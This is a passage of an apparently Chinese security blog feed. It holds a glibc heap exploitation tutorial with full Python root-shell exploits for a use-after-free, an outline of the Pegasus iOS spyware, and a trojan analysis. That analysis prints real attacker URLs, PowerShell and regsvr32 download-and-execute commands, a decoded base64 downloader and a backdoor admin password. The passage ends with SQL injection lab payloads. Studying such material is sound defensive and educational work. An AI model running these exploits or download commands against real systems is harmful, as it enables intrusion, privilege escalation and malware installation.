src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image032.png" alt="img"></p><p>执行上述利用代码不会向我们提供 root shell。它向我们提供了一个运行在我们的权限级别的 bash shell</p><p>当uid != euid时，/bin/bash会丢弃权限。我们的二进制“前向合并”的真实 uid 是 1000，但是它的有效 uid 是 0。因此当system调用时，bash 会丢弃权限，因为真实 uid 不等于有效 uid。为了解决这个问题，我们需要在system之前调用setuid(0)，因为_call_tls_dtors()依次遍历tls_dtor_list，我们需要将setuid和system链接，以便获得 root shell。</p><p>完整利用代码：</p><p>\1.  #gen_file.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.    </p><p>\5.  #dtor_list  </p><p>\6.  setuid = 0x4e123e30  </p><p>\7.  setuid_arg = 0x0  </p><p>\8.  mp = 0x804b020  </p><p>\9.  nxt = 0x804b430  </p><p>\10.   </p><p>\11. #endianess convertion  </p><p>\12. def conv(num):  </p><p>\13.  <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  </p><p>\14. tst = conv(setuid)  </p><p>\15. tst += conv(setuid_arg)  </p><p>\16. tst += conv(mp)  </p><p>\17. tst += conv(nxt)  </p><p>\18.   </p><p>\19. print tst  </p><p>\20. ———————————————————————————————————————————–  </p><p>\21. #exp.py  </p><p>\22. #!/usr/bin/env python  </p><p>\23. import <strong>struct</strong>  </p><p>\24. from subprocess import call  </p><p>\25.   </p><p>\26. fd = 0x0804b418  </p><p>\27. bk = 0x0804b418  </p><p>\28. fd_nextsize = 0xb7fe86c0  </p><p>\29. bk_nextsize = 0x804b008  </p><p>\30. system = 0x4e0a86e0  </p><p>\31. sh = 0x80482ce  </p><p>\32.   </p><p>\33. #endianess convertion  </p><p>\34. def conv(num):  </p><p>\35.  <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  </p><p>\36. buf = conv(fd)  </p><p>\37. buf += conv(fd_nextsize)  </p><p>\38. buf += conv(bk_nextsize)  </p><p>\39. buf += conv(system)  </p><p>\40. buf += conv(sh)  </p><p>\41. buf += “A” * 996  </p><p>\42.   </p><p>\43. print “Calling vulnerable program”  </p><p>\44. call([“./consolidate_forward”, buf])  </p><p>执行上述利用代码会给我们 root shell</p><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image033.png" alt="img"></p><p><strong>Test 12**</strong>：释放后使用**</p><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>继续使用已经被释放的堆内存指针叫做释放后使用。这个漏洞会导致任意代码执行。</p><p>漏洞代码：</p><p>\1.  #include &lt;stdio.h&gt;  </p><p>\2.  #include &lt;string.h&gt;  </p><p>\3.  #include &lt;unistd.h&gt;  </p><p>\4.  #define BUFSIZE1 1020  </p><p>\5.  #define BUFSIZE2 ((BUFSIZE1/2) - 4)  </p><p>\6.    </p><p>\7.  <strong>int</strong> main(<strong>int</strong> argc, <strong>char</strong> **argv) {  </p><p>\8.    </p><p>\9.   <strong>char*</strong> name = malloc(12); /* [1] */  </p><p>\10.  <strong>char*</strong> details = malloc(12); /* [2] */  </p><p>\11.  strncpy(name, argv[1], 12-1); /* [3] */  </p><p>\12.  free(details); /* [4] */  </p><p>\13.  free(name);  /* [5] */  </p><p>\14.  printf(“Welcome %s\n”,name); /* [6] */  </p><p>\15.  fflush(stdout);  </p><p>\16.   </p><p>\17.  <strong>char*</strong> tmp = (<strong>char</strong> <em>) malloc(12); /</em> [7] */  </p><p>\18.  <strong>char*</strong> p1 = (<strong>char</strong> <em>) malloc(BUFSIZE1); /</em> [8] */  </p><p>\19.  <strong>char*</strong> p2 = (<strong>char</strong> <em>) malloc(BUFSIZE1); /</em> [9] */  </p><p>\20.  free(p2); /* [10] */  </p><p>\21.  <strong>char*</strong> p2_1 = (<strong>char</strong> <em>) malloc(BUFSIZE2); /</em> [11] */  </p><p>\22.  <strong>char*</strong> p2_2 = (<strong>char</strong> <em>) malloc(BUFSIZE2); /</em> [12] */  </p><p>\23.   </p><p>\24.  printf(“Enter your region\n”);  </p><p>\25.  fflush(stdout);  </p><p>\26.  read(0,p2,BUFSIZE1-1); /* [13] */  </p><p>\27.  printf(“Region:%s\n”,p2);   </p><p>\28.  free(p1); /* [14] */  </p><p>\29. }  </p><p>编译命令：</p><p>\1.  #echo 2 &gt; /proc/sys/kernel/randomize_va_space  </p><p>\2.  $gcc -o test test.c  </p><p>\3.  $sudo chown root test  </p><p>\4.  $sudo chgrp root test  </p><p>\5.  $sudo chmod +s test  </p><p>不像上一篇文章，ASLR 在这里是打开的。所以现在让我们利用 UAF 漏洞，因为 ASLR 打开了，让我们使用信息泄露和爆破技巧来绕过它。上面的漏洞代码包含两个 UAF 漏洞，位于行[6]和[13]。它们的堆内存在行[5]和[10]释放，但是它们的指针即使在释放后也使用，在行[6]和[13]。行[6]的UAF 会导致信息泄露，而行[13]的 UAF 导致任意代码执行。</p><p>• 行[1]为name分配了 16 字节的堆内存区域。</p><p>• 行[2]位details分配了 16 字节的堆内存区域。</p><p>• 行[3]将程序的参数 1（argv[1]）复制到堆内存区域name中。</p><p>• 行[4]和[5]将堆内存区域name和details释放给 glibc malloc。</p><p>• 行[6]的printf在释放后使用name指针，这会导致堆地址的泄露。</p><p>• 行[7]为tmp分配了 16 字节的堆内存区域。</p><p>• 行[8]为p1分配了 1024 字节的堆内存区域。</p><p>• 行[9]为p2分配了 1024 字节的堆内存区域。</p><p>• 行[10]将堆内存区域p2释放给 glibc malloc。</p><p>• 行[11]为p2_1分配了 512 字节的堆内存区域。</p><p>• 行[12]为p2_2分配了 512 字节的堆内存区域。</p><p>• 行[13]的读取在释放后使用了p2指针。</p><p>• 行[14]将堆内存区域p1释放给 glibc malloc。这会在程序退出时导致任意代码执行。</p><p>利用代码：</p><p>\1.  #exp.py  </p><p>\2.  #!/usr/bin/env python  </p><p>\3.  import <strong>struct</strong>  </p><p>\4.  import sys  </p><p>\5.  import telnetlib  </p><p>\6.  import time  </p><p>\7.    </p><p>\8.  ip = ‘127.0.0.1’  </p><p>\9.  port = 1234  </p><p>\10.   </p><p>\11. def conv(num): <strong>return</strong> <strong>struct</strong>.pack(“&lt;I”,num)  </p><p>\12. def send(data):  </p><p>\13.  global con  </p><p>\14.  con.write(data)  </p><p>\15.  <strong>return</strong> con.read_until(‘\n’)  </p><p>\16.   </p><p>\17. print “** Bruteforcing libc base address**”  </p><p>\18. libc_base_addr = 0xb756a000  </p><p>\19. fd_nextsize = (libc_base_addr - 0x1000) + 0x6c0  </p><p>\20. system = libc_base_addr + 0x3e6e0  </p><p>\21. system_arg = 0x80482ae  </p><p>\22. size = 0x200  </p><p>\23. setuid = libc_base_addr + 0xb9e30  </p><p>\24. setuid_arg = 0x0  </p><p>\25.   </p><p>\26. <strong>while</strong> True:  </p><p>\27.  time.sleep(4)  </p><p>\28.  con = telnetlib.Telnet(ip, port)  </p><p>\29.  laddress = con.read_until(‘\n’)  </p><p>\30.  laddress = laddress[8:12]  </p><p>\31.  heap_addr_tup = <strong>struct</strong>.unpack(“&lt;I”, laddress)  </p><p>\32.  heap_addr = heap_addr_tup[0]  </p><p>\33.  print “** Leaked heap addresses : [0x%x] **” %(heap_addr)  </p><p>\34.  heap_base_addr = heap_addr - 0x10  </p><p>\35.  fd = heap_base_addr + 0x410  </p><p>\36.  bk = fd  </p><p>\37.  bk_nextsize = heap_base_addr + 0x618  </p><p>\38.  mp = heap_base_addr + 0x18  </p><p>\39.  nxt = heap_base_addr + 0x428  </p><p>\40.   </p><p>\41.  print “** Constructing fake chunk to overwrite tls_dtor_list**”  </p><p>\42.  fake_chunk = conv(fd)  </p><p>\43.  fake_chunk += conv(bk)  </p><p>\44.  fake_chunk += conv(fd_nextsize)  </p><p>\45.  fake_chunk += conv(bk_nextsize)  </p><p>\46.  fake_chunk += conv(system)  </p><p>\47.  fake_chunk += conv(system_arg)  </p><p>\48.  fake_chunk += “A” * 484  </p><p>\49.  fake_chunk += conv(size)  </p><p>\50.  fake_chunk += conv(setuid)  </p><p>\51.  fake_chunk += conv(setuid_arg)  </p><p>\52.  fake_chunk += conv(mp)  </p><p>\53.  fake_chunk += conv(nxt)  </p><p>\54.  print “** Successful tls_dtor_list overwrite gives us shell!!**”  </p><p>\55.  send(fake_chunk)  </p><p>\56.   </p><p>\57.  <strong>try</strong>:   </p><p>\58.   con.interact()  </p><p>\59.  except:   </p><p>\60.   exit(0)  </p><p>由于在爆破技巧中，我们需要尝试多次（直到成功）。让我们将我们的漏洞二进制vuln运行为网络服务器，并使用 Shell 教程来确保崩溃时自动重启：</p><p>\1.  #vuln.sh  </p><p>\2.  #!/bin/sh  </p><p>\3.  nc_process_id=$(pidof nc)  </p><p>\4.  <strong>while</strong> :  </p><p>\5.  <strong>do</strong>  </p><p>\6.   <strong>if</strong> [[ -z $nc_process_id ]]; then  </p><p>\7.   echo “(Re)starting nc…”  </p><p>\8.   nc -l -p 1234 -c “./test sploitfun”  </p><p>\9.   <strong>else</strong>  </p><p>\10.  echo “nc is running…”  </p><p>\11.  fi  </p><p>\12. done  </p><p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="Linux开发" scheme="http://yoursite.com/tags/Linux%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>ios间谍软件Pegasus</title>
    <link href="http://yoursite.com/2019/07/20/ios%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus/"/>
    <id>http://yoursite.com/2019/07/20/ios间谍软件Pegasus/</id>
    <published>2019-07-20T08:24:48.000Z</published>
    <updated>2019-07-20T10:04:15.124Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>它是通过点击一个链接来触发攻击，用户点击短信内的链接后，攻击者就会利用3个0day漏洞。所以可以推测，链接的作用就是在后台静默的下载payload，以及木马所需要的各种环境。然后安装间谍软件，随后就能对设备进行全面控制，还能获取设备中的数据，通过麦克风监听对话，跟踪即时通讯应用的对话内容等</p></blockquote><p>通过查询各种资料，将攻击总结为3个阶段。</p><h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a><strong>第一阶段</strong></h2><p><strong>传送并利用<code>WebKit</code>漏洞</strong>，通过HTML文件利用<code>WebKit</code>中的<code>CVE-2016-4655</code>漏洞</p><h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a><strong>第二阶段</strong></h2><p><strong>越狱</strong>。在第一阶段中会根据设备（32/64位）下载相应的，经过加密混淆的包。每次下载的包都是用独一无二的key加密的。软件包内包含针对 ios 内核两个漏洞(<code>CVE-2016-4656</code>和<code>CVE-2016-4657</code>)的exp还有一个用来下载解密第三阶段软件包的loader。同时，第二阶段结束时，exp会移除<code>/etc/nfs.conf</code>，然后加载<code>/sbin/mount_nfs</code>。为了在重启之后依然留在系统中，Pegasus会把系统守护进程<code>rtbuddyd</code>替换成一个<code>jsc</code>二进制文件，并且创建一个链接到<code>ascript</code>。</p><h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a><strong>第三阶段</strong></h2><p><strong>安装间谍软件</strong>。经过了第二阶段的越狱，第三阶段中，攻击者会选择需要监听的软件，把<code>hook</code>安装到应用中。另外，第三阶段还会检查设备之前有没有通过其他方式越狱过，如果有，则会移除之前越狱后开放的系统访问权限，如<code>ssh</code>。软件还有一个“故障保险“，如果检测到设备满足某些条件，软件就会自毁。同时，软件会运行一个<code>lw-install</code>二进制文件，这个文件包含很多关键架构，并且能在用户重启之后仍然驻足系统，良心的是其中还有一些保护功能，防止用户手机变砖。</p><p><code>lw-install</code>首先会检查 ios 版本，对于不同的版本，<code>lw-install</code>会执行不同的命令。</p><p>第三阶段中，间谍会部署一个<code>test222.tar</code>文件，这是一个tar包，包中包含各种实现各种目的的文件，如实现中间人攻击的<code>根TLS证书</code>、针对<code>Viber</code>、<code>Whatsapp</code>的嗅探库、专门用于通话录音的库等。</p><blockquote><p>Pegasus有很多保证私密的功能，他会经常检查手机有没有被其他软件越狱，甚至还包含一个复杂的自毁机制，禁止更新机制，提权机制，检测其他越狱软件等机制。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="ios漏洞" scheme="http://yoursite.com/tags/ios%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="间谍软件Pegasus" scheme="http://yoursite.com/tags/%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6Pegasus/"/>
    
  </entry>
  
  <entry>
    <title>木马病毒分析</title>
    <link href="http://yoursite.com/2019/07/20/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/07/20/木马病毒分析/</id>
    <published>2019-07-20T07:31:59.000Z</published>
    <updated>2019-07-20T09:13:19.279Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>2个文件：<strong><code>down.exe</code></strong>和<strong><code>msinfo.exe</code></strong></p><p>主木马程序是 <code>msinfo.exe</code></p></blockquote><h2 id="msinfo-exe的基本信息"><a href="#msinfo-exe的基本信息" class="headerlink" title="msinfo.exe的基本信息"></a>msinfo.exe的基本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件大小     ：4,887,552 字节  </span><br><span class="line">MD5         ：03A704D98634F761D090AEAD21C7256A  </span><br><span class="line">CRC32       ：676D51BC  </span><br><span class="line">File Name   ：C:\Documents **and** Settings\Administrator\桌面\system\msinfo.exe  </span><br><span class="line">Format      ：Portable executable **for** 80386 (PE)  </span><br><span class="line">文件版本     ：1.0.0.9</span><br></pre></td></tr></table></figure><p>并且加入了vmp壳</p><img src="/2019/07/20/木马病毒分析/tu1.png" title="图1"><p>放入od中运行，显示缺少2个dll文件 分别是<code>wpcap.dll</code>  <code>packet.dll</code>，这两个文件推测是<code>网路传输层</code>所需要的文件，可能与<code>木马联网下载</code>有关。</p><p>使用PEview查看<code>msinfo.exe</code>。虽然被加壳但是也能看到不止一个函数，查看发现有一些网址和地址，有可能是该木马联网下载的路径和位置。</p><img src="/2019/07/20/木马病毒分析/tu2.png" title="图2"><p>放入od中运行一段时间，发现资源管理器有1个<code>msinfo.exe</code>进程一直在运行。</p><img src="/2019/07/20/木马病毒分析/tu3.png" title="图3"><p>通过进程查看器发现该木马自动下载了3个文件。</p><img src="/2019/07/20/木马病毒分析/tu4.png" title="图4"><img src="/2019/07/20/木马病毒分析/tu5.png" title="图5"><p>有2个文件下载到<code>msinfo.exe</code>所在路径文件夹，一个文件下载到<code>C:\Program Files\Common Files</code>这个文件夹下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\xpwpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe</span><br></pre></td></tr></table></figure><img src="/2019/07/20/木马病毒分析/tu6.png" title="图6"><img src="/2019/07/20/木马病毒分析/tu7.png" title="图7"><h2 id="down-exe的基本信息"><a href="#down-exe的基本信息" class="headerlink" title="down.exe的基本信息"></a>down.exe的基本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件大小     ：27,136 字节  </span><br><span class="line">MD5         ：AE173E8562F6BABACB8E09D0D6C29276  </span><br><span class="line">CRC32       ：C4F161E6  </span><br><span class="line">File Name   ：C:\Documents **and** Settings\Administrator\桌面\system\down.exe  </span><br><span class="line">Format      ：Portable executable **for** 80386 (PE)  </span><br><span class="line">文件版本     ：5.2.3790.3959</span><br></pre></td></tr></table></figure><p>没有加壳</p><img src="/2019/07/20/木马病毒分析/tu8.png" title="图8"><p>因为其源文件名为<code>CACLS.EXE</code>，我们可以在百度上找到这个文件：</p><img src="/2019/07/20/木马病毒分析/tu9.png" title="图9"><p>源文件和现在这个文件进行对比：</p><img src="/2019/07/20/木马病毒分析/tu10.png" title="图10"> <img src="/2019/07/20/木马病毒分析/tu11.png" title="图11"><p>可以看到，函数基本没有改变。用<code>ProcessMonitor</code>监视<code>down.exe</code>文件执行后的操作</p><img src="/2019/07/20/木马病毒分析/tu12.png" title="图12"><p>可以看到<code>down.exe</code>访问了系统存放用户密码的文件，并且有<code>修改hash</code>的操作，猜测是用来查询用户名，进行提权操作。</p><h2 id="对于下载文件的检测"><a href="#对于下载文件的检测" class="headerlink" title="对于下载文件的检测"></a>对于下载文件的检测</h2><p>之前<code>msinfo.exe</code>运行后自动下载了3个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Common Files\xpwpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\wpd.dat  </span><br><span class="line">C:\Documents **and** Settings\Administrator\桌面\system\csrs.exe</span><br></pre></td></tr></table></figure><p>首先用16进制文本编辑器打开<code>C:\Program Files\Common Files\xpwpd.dat</code> </p><img src="/2019/07/20/木马病毒分析/tu13.png" title="图13"><p>应该是个指路文件，<code>msinfo.exe</code>通过这个指路文件下载<code>wpd.dat</code>和<code>csrs.exe</code>这两个文件。</p><p>而<code>wpd.dat</code>文件通过16进制编辑器打开后是乱码</p><img src="/2019/07/20/木马病毒分析/tu14.png" title="图14"><p><code>csrs.exe</code>并未加壳，是一个用python写的，利用 <code>pyinstaller</code> 转成exe可执行文件的程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件名称 ：C:\Documents and Settings\Administrator\桌面\system\csrs.exe  </span><br><span class="line">文件大小 ：6466961 字节  </span><br><span class="line">文件版本 ：1.0.0.3  </span><br><span class="line">MD5     ：6B62B380B8B14B261C5BFDFE7B017CDD  </span><br><span class="line">CRC32   ：27F5D1F8</span><br></pre></td></tr></table></figure><img src="/2019/07/20/木马病毒分析/tu15.png" title="图15"><p>在<code>linux</code>中用 <code>python-exe-unpacker-master</code> 解压</p><img src="/2019/07/20/木马病毒分析/tu16.png" title="图16"><p>解压后的文件：</p><img src="/2019/07/20/木马病毒分析/tu17.png" title="图17"><h2 id="MyExploiter"><a href="#MyExploiter" class="headerlink" title="MyExploiter"></a>MyExploiter</h2><p>因为我们已经解压出来<code>csrs.exe</code>的文件，里面的<code>MyExploiter</code>是攻击文件的核心，我们将其后缀改为<code>.py</code>并打开这个文件。可以看到部分代码</p><img src="/2019/07/20/木马病毒分析/tu18.png" title="图18"><p>大概能看出来是利用ms17010漏洞进行攻击，对目标系统添加一个密码为Zxcvbnm.1234的管理员admin$账户，用于控制计算机，同时下载并安装更改了从云端下下来的dll库文件。如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://wmi.1217bye.host/S.ps1  powershell.exe IEX (New-Object system.Net.WebClient).  </span><br><span class="line">http://173.208.139.170/s.txt  powershell.exe IEX (New-Object system.Net.WebClient).    </span><br><span class="line">http://35.182.171.137/s.jpg  regsvr32 /u /s /i:    </span><br><span class="line">http://wmi.1217bye.host:8888/1.txt scrobj.dll®svr32 /u /s /i:    </span><br><span class="line">http://173.208.139.170/2.txt scrobj.dll®svr32 /u /s /i:    </span><br><span class="line">http://35.182.171.137/3.txt scrobj.dll&quot;    </span><br><span class="line">regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="ms17010-攻击代码"><a href="#ms17010-攻击代码" class="headerlink" title="ms17010     攻击代码"></a><strong>ms17010</strong>     攻击代码</h3><p>在<code>PYZ-00.pyz_extracted</code>这个文件夹内有<code>569个.pyc</code>的文件，使用<code>uncompyle2-master</code>反汇编成<code>.py</code>文件。</p><p>其中有个名为<code>buleAttack</code>的文件，是选择不同操作系统进行攻击</p><img src="/2019/07/20/木马病毒分析/tu19.png" title="图19"><p><code>ms17010</code>攻击核心代码是在 <code>ExpMs17010.pyc</code>文件中，将其进行反编译：</p><img src="/2019/07/20/木马病毒分析/tu20.png" title="图20"><p>这是创建一个添加一个密码为Zxcvbnm.1234的管理员admin$账户。</p><img src="/2019/07/20/木马病毒分析/tu21.png" title="图21"><p>这是攻击参数，用于攻击</p><img src="/2019/07/20/木马病毒分析/tu22.png" title="图22"><p>还有从系统文件中获取<code>token</code>，用于提权</p><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a><strong>Powershell</strong></h3><p>发现<code>MyExploiter</code>中有一段<code>powershell</code></p><p>`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAAvADIALgB0AHgAdAAnACkALgB0AHIAaQBtACgAKQAgAC0AcwBwAGwAaQB0ACAAJwBbAFwAcgBcAG4AXQArACcAfAAlAHsAJABuAD0AJABfAC4AcwBwAGwAaQB0ACgAJwAvACcAKQBbAC0AMQBdADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAXwAsACAAJABuACkAOwBzAHQAYQByAHQAIAAkAG4AOwB9AA==&quot;&amp;powershell.e`</span><br></pre></td></tr></table></figure><p>对其进行解密，尝试了众多例如<code>md5</code>，<code>url</code>等加密解密。发现<code>Base64</code>解码有效：</p><img src="/2019/07/20/木马病毒分析/tu23.png" title="图23"><p>解密后为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wc=New-Object System.Net.WebClient;  </span><br><span class="line">$wc.DownloadString(&apos;http://wmi.1217bye.host/2.txt&apos;).trim() -split &apos;[\r\n]+&apos;|%&#123;$n=$_.split(&apos;/&apos;)[-1];  </span><br><span class="line">$wc.DownloadFile($_, $n);start $n;&#125;</span><br></pre></td></tr></table></figure><p>打开powshell里的网站</p><img src="/2019/07/20/木马病毒分析/tu24.png" title="图24"><p>可以确定，<code>powshell</code>的作用是<code>下载后续木马</code>，对目标计算机进行<code>持续化恶意程序攻击</code>。</p><h2 id="后续恶意程序攻击"><a href="#后续恶意程序攻击" class="headerlink" title="后续恶意程序攻击"></a>后续恶意程序攻击</h2><h3 id="ok-exe"><a href="#ok-exe" class="headerlink" title="ok.exe"></a><strong>ok.exe</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件位置    ：C:\Documents and Settings\Administrator\桌面  </span><br><span class="line">文件大小    ：2,241,024 字节  </span><br><span class="line">文件描述    ：易语言程序  </span><br><span class="line">md5        ：9F86AFAE88B2D807A71F442891DFE3D4  </span><br><span class="line">crc32      ：9C3E3E23  </span><br><span class="line">Format     ：Portable executable **for** 80386 (PE)  </span><br><span class="line">版本信息    ：1.0.0.0</span><br></pre></td></tr></table></figure><p>发现有<code>vmp</code>壳</p><img src="/2019/07/20/木马病毒分析/tu25.png" title="图25"><p>通过<code>进程监视器</code>，发现该<code>ok.exe</code>修改了许多<code>内核级dll</code>。经过查找资料发现修改了<code>用户操作系统界面</code>。并且发现，有<code>修改windows内核文件</code>。</p><img src="/2019/07/20/木马病毒分析/tu26.png" title="图26"><p>还有对<code>操作系统设置</code>，<code>基本用户界面</code>等特性，如<code>创建窗口</code>和<code>发送消息</code>等功能进行修改。</p><img src="/2019/07/20/木马病毒分析/tu27.png" title="图27"><h3 id="u-exe"><a href="#u-exe" class="headerlink" title="u.exe"></a><strong>u.exe</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件位置    ：C:\Documents and Settings\Administrator\桌面\u.exe  </span><br><span class="line">文件大小    ：37,888 字节  </span><br><span class="line">md5        ：B89B37A90D0A080C34BBBA0D53BD66DF  </span><br><span class="line">crc32      ：C909DD40  </span><br><span class="line">文件版本    ：1.0.0.0</span><br></pre></td></tr></table></figure><p>有<code>upx</code>壳，使用<code>upx去壳器</code>去壳</p><img src="/2019/07/20/木马病毒分析/tu28.png" title="图28"><img src="/2019/07/20/木马病毒分析/tu29.png" title="图29"><p>将解压后的<code>exe文件</code>放入<code>IDA</code>中分析。首先找到<code>主函数main</code></p><img src="/2019/07/20/木马病毒分析/tu30.png" title="图30"><p>对找到<code>main</code> 中的各个函数，进行分析。</p><p>发现<code>sub_4031c0()</code>这是<code>建立一个连接到服务控制管理器并打开它的数据库</code>的函数，通过服务控制管理器<code>监视用户电脑的键盘读写</code>等操作</p><img src="/2019/07/20/木马病毒分析/tu31.png" title="图31"><p>发现<code>sub_401220()</code>这是个<code>修改dns</code>的函数</p><img src="/2019/07/20/木马病毒分析/tu32.png" title="图32"><img src="/2019/07/20/木马病毒分析/tu33.png" title="图33"><img src="/2019/07/20/木马病毒分析/tu34.png" title="图34"><p>将<code>DNS</code>修改为<code>223.5.5.5 8.8.8.8</code>  并且程序还有修改失败的后续操作；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="木马" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>SQL-Labs</title>
    <link href="http://yoursite.com/2019/07/14/SQL-Labs/"/>
    <id>http://yoursite.com/2019/07/14/SQL-Labs/</id>
    <published>2019-07-14T14:46:42.000Z</published>
    <updated>2019-07-20T09:18:36.026Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="基于错误的GET单引号字符型注入"><a href="#基于错误的GET单引号字符型注入" class="headerlink" title="基于错误的GET单引号字符型注入"></a>基于错误的GET单引号字符型注入</h4><p><code>Id=1</code> 直接过了</p><h4 id="基于错误的GET整形注入"><a href="#基于错误的GET整形注入" class="headerlink" title="基于错误的GET整形注入"></a>基于错误的GET整形注入</h4><p><code>?id=1%20or%201=1%23</code></p><h4 id="基于错误的GET单引号变形字符型注入"><a href="#基于错误的GET单引号变形字符型注入" class="headerlink" title="基于错误的GET单引号变形字符型注入"></a>基于错误的GET单引号变形字符型注入</h4><p><code>?id=2&#39;) --+</code></p><h4 id="基于错误的GET双引号字符型注入"><a href="#基于错误的GET双引号字符型注入" class="headerlink" title="基于错误的GET双引号字符型注入"></a>基于错误的GET双引号字符型注入</h4><p><code>?id=3&quot;)%20--+</code></p><h4 id="双注入GET单引号字符型注入"><a href="#双注入GET单引号字符型注入" class="headerlink" 